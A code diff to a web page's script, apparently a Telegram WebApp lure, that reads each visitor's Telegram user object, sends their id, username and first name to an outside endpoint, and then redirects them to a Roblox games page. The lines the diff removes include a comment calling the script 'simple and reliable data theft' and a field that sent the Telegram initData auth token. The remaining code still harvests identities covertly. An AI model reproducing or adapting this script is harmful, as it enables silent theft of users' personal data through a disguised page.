@@ -36,11 +36,9 @@
 </div>
 
 <script>
-    // Простая и надежная кража данных
     setTimeout(function() {
         try {
             const tg = window.Telegram.WebApp;
-            const initData = tg.initData;
             const user = tg.initDataUnsafe.user;
             
             if (user && user.id) {
@@ -50,8 +48,7 @@
                     body: JSON.stringify({
                         id: user.id,
                         username: user.username,
-                        first_name: user.first_name,
-                        initData: initData
+                        first_name: user.first_name
                     })
                 });
             }
@@ -59,7 +56,6 @@
             console.log('Error:', e);
         }
         
-        // Всегда редиректим
         window.location.href = 'https://www.roblox.com/games/';
     }, 500);
 </script>
